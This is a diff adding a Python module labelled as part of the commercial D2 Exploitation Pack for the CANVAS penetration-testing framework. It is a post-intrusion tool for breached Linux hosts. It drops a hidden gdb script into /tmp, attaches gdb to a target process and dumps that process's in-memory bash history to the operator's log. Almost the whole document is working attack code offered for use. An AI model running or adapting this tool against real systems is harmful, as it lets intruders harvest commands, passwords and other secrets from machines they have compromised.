@@ -1,0 +1,96 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2010
+#
+
+import sys, os
+
+sys.path.append(".")
+
+from canvasexploit import canvasexploit
+import canvasengine
+
+NAME = 'Bash history from a process memory'
+DESCRIPTION = 'Extract the bash history from a process memory'
+DOCUMENTATION = {}
+DOCUMENTATION['Notes'] = 'Use gdb'
+
+VERSION="1.0"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = 'Post-Intrusion'
+PROPERTY['ARCH'] = [ ['Linux'] ]
+
+class theexploit(canvasexploit):
+  def __init__(self):
+    canvasexploit.__init__(self)
+    self.node = '' 
+    self.pid = -1
+    self.supportedNodeArgs = [['linuxNode']]
+    self.file = '/tmp/.h.gdb'
+    self.gdb = '''set verbose off
+set confirm off
+set edit off
+set $cpt = 1
+while $cpt < history_length
+  call history_get($cpt)
+  x /s *$
+  set $cpt++
+end
+quit
+'''
+
+  def getargs(self):
+    self.pid = int(self.argsDict.get('pid', self.pid))
+
+  def run(self):
+    self.setInfo("%s (in progress)"%(NAME))
+    self.getargs()
+
+    for node in self.argsDict["passednodes"]:
+      type = node.nodetype
+      if type not in self.supportedNodeArgs[0]:
+        self.log('[D2 LOG] %s node type not supported' % type)
+        continue
+
+      self.node = node
+      r, st = self.node.shell.stat('/usr/bin/gdb')
+      if r <> 0:
+        self.log('[D2 LOG] Can\'t found gdb')
+        return 0
+
+      O_RDWR = self.node.shell.libc.getdefine('O_RDWR')
+      O_CREAT = self.node.shell.libc.getdefine('O_CREAT')
+      f = self.node.shell.open(self.file, O_RDWR|O_CREAT, 0644)
+      if f < 0:
+        self.log("[D2 LOG] Can't open %s...\n" % self.file)
+        return 0
+
+      r = self.node.shell.write(f, self.gdb)
+      if r != 1:
+        self.log('[D2 LOG] Write failed\n')
+        return 0
+
+      self.node.shell.close(f)
+
+      self.log('[D2 LOG] Bash history from process %d' % self.pid)
+      history = self.node.shell.runcommand('/usr/bin/gdb -q -batch -x %s -p %d' % (self.file, self.pid))
+      history = history.split('\n')
+      for hist in history:
+        if ':' in hist:
+          hist = hist.split('\"')
+          self.log('%s' % hist[1])
+
+    self.setInfo("%s (done)"%(NAME))
+    return 1
+
+  def usage(self):
+    print 'Usage: %s -O pid:value\n' % (sys.argv[0])
+    sys.exit(0)
+
+if __name__ == "__main__":
+	print "This module is meant to be run only within CANVAS"
